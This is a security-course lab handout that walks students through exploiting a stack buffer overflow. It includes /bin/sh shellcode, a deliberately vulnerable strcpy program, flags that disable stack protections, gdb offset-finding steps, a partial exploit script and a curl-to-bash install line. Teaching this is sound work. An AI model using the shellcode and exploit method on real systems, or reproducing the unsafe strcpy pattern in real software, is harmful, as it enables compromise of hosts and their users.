# Lab 5: Buffer Overflow Vulnerability

* __Please Note:__ This lab must be completed on our __Kali Linux__ machine. 
* For this lab it would be helpful to install GEF (GDB Enhanced Features) in your Kali Linux shell. 
    ```SHELL
    $ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
    ``` 
* First read this page then start working through the lab with the GitHub classroom link below. 
* The files that you need to complete this lab are also found in the GitHub repository.
* Put your answers in the `README.md` file in the GitHub repository.
* Github Classroom Link: [https://classroom.github.com/a/ezrG-uE\_](https://classroom.github.com/a/ezrG-uE_)


### Objective

Learn about how to take advantage of a buffer overflow in a vulnerable program to run shellcode with the goal of identifying and preventing such vulnerabilities.


### Invoking Shellcode 

I have provided the binary shellcode to spawn a new `/bin/sh` shell, and
placed the code in a C program called `call_shellcode.c`. 

__call_shellcode.c__
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode); // Copy the shellcode to the stack
   int (*func)() = (int(*)())code;
   func();                 // Invoke the shellcode from the stack
   return 1;
} 
```
 
Compile and run the program and describe your observations. It should be noted that the compilation uses the `execstack` option, which allows code to be executed from the stack; without this option, the program will fail.

```SHELL
$ gcc -m32 -z execstack call_shellcode.c -o call_shellcode
$ ./call_shellcode
```

Confirm you are in the `/bin/sh` shell. Then exit back to `/bin/zsh`.

```SHELL
$ ps -p $$
$ exit
```

Compile the program without the -z execstack option. Does it spawn the shell?

```SHELL
$ gcc -m32 call_shellcode.c -o call_shellcode
$ ./call_shellcode
```


### Understanding the Vulnerable Program

The vulnerable program used in this lab is called 
`stack.c`, which is in your GitHub repository for this lab. 
This program has a buffer-overflow vulnerability,
and your job is to exploit this vulnerability and spawn a shell. 

__stack.c__
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char* str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char* str)
{
    // Create the dummy buffer that will be filled with zeros. 
    char dummy_buffer[1000];

    // memset() is used to fill a block of memory with a particular value
    memset(dummy_buffer, 0, 1000);
    
    // Call the function containing the buffer overflow. 
    bof(str);
}

int main(int argc, char *argv[])
{
    char str[517];

    FILE* badfile;

    // Open the badfile. 
    badfile = fopen("badfile", "r"); 
    if (!badfile) 
    {
       perror("Opening badfile"); 
       exit(1);
    }

    // Read the badfile into the str character array.
    int length = fread(str, sizeof(char), 517, badfile);
    
    printf("Input size: %d\n", length);
    
    dummy_function(str);

    fprintf(stdout, "==== Returned Properly ====\n");

    return 0;
}
```

The above program has a buffer overflow vulnerability. 
It first reads an input from a file called `badfile`, and then passes this
input to another buffer in the function `bof()`. 
The original input can have a maximum length of `517` bytes, but the buffer
in `bof()` is only `BUF_SIZE` bytes long, which is less than `517`. 
Because `strcpy()` does not check boundaries, buffer overflow will occur.
It should be noted that the program gets its input from a file called `badfile`.
This file is under the user's control. Now, our objective is to 
create the contents for `badfile`, such that when the vulnerable program
copies the contents into its buffer, a shell can be spawned. 

Start your investigation of this buffer overflow by drawing a picture of the stack when the code reaches the line `strcpy(buffer, str);` in the `bof()` function.

### Compilation and Investigation

To compile the above vulnerable program, do not forget to 
turn off the stack protector and the non-executable stack protections 
using the `-fno-stack-protector` and `-z execstack` options.

To exploit the buffer-overflow vulnerability in the target program,
the most important thing to know is the distance between the 
buffer's starting position and the place where the return-address
is stored. We will use the debugger to find it out.
Since we have the source code of the target program, we
can compile it with the debugging flag turned on. That will make it more
convenient to debug. We will add the `-g` flag to `gcc` command, so debugging information is added to the binary.


```SHELL
$ gcc -m32 -z execstack -fno-stack-protector -g stack.c -o stack
```

We need to create a file called `badfile` before running the program.

```SHELL
$ touch badfile
```

Next, lets investigate the binary with the debugger to find the buffer's starting position and the place where the return-address is stored. We want to find the distance (number of bytes) from the start of the buffer that we are going to overflow to the place where we will store the return address. This overflow distance is a decimal number of bytes. Remember the formula for this is: `offset = ebp - starting_address_of_buffer + 4`. Convert to decimal to get the number of bytes. 


Start the debugger. Set a break point at function `bof()`. Start executing the program.
Get the ebp value. Get the buffer's address. Use this information to calculate the offset.

```SHELL
$ gdb stack
gef➤ break bof       
gef➤ run   
gef➤ print $ebp 
gef➤ print &buffer   
gef➤ quit 
```

Write down your calculation of the offset in the `README.md` file in your GitHub repository. 

### Launching Attacks

To exploit the buffer-overflow vulnerability in the target program,
we need to prepare a payload, and save it inside `badfile`. 
We will use a Python program to do that.
A skeleton program called `exploit.py` is included in the lab setup file.
The code is incomplete, and you need to replace some of the essential
values in the code.


```python
#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # Change this number 
content[start:(start + len(shellcode))] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x00           # Change this number 
offset = 0              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:(offset + L)] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

```

Note: you must replace 3 numbers labelled `# Change this number`. 

After you finish the above program, run it. This will generate
the contents for `badfile`. Take note in your `README.md` file of the number of bytes in the `badfile`. Why is this the case?

```SHELL
$ ./exploit.py
$ ls -l badfile 
$ wc badfile  
$ cat badfile  
```


In your `README.md` file, explain how the values used in your 
`exploit.py` are decided. These values are the most 
important part of the attack, so give a detailed explanation. 
Include a __drawing__ of the stack memory at the time of the attack. This can be a hand drawing that you take a picture of and add to your repository.


Next, let's see how the attack looks from the debugger.

```SHELL
$ gdb stack
gef➤ break bof       
gef➤ run
```

The debugger will stop on the line with the buffer overflow, but this line has not been executed yet.  Let's examine the memory around in the buffer, and after ebp __before__ the overflow. We will use the `x` command which is the examine command in `gdb`, and we will specify 100 words(4 bytes each) to examine. We will also inspect the stack. Make a note of what you find in your `README.md` file.

```SHELL 
gef➤ x/100wx &buffer
gef➤ x/100wx $ebp
gef➤ info stack
```

Now, lets execute the buffer overflow line of code, and then reexamine the memory. Make a note of what you find in your `README.md` file.

```SHELL
gef➤ step
gef➤ x/100wx &buffer
gef➤ x/100wx $ebp
gef➤ info stack
```

What has changed? Record this observation in your `README.md` file.

Now, we can `continue` the execution, and if everything is working correctly, it will slide down the `nop` sled and run the `shellcode`.  You should see a `$` prompt and be inside a new shell.

```SHELL
gef➤ continue
$
$ ls
$ ps -p $$
```

You can now exit the shell and quit the debugger.

```SHELL
$ exit
gef➤ quit 
```


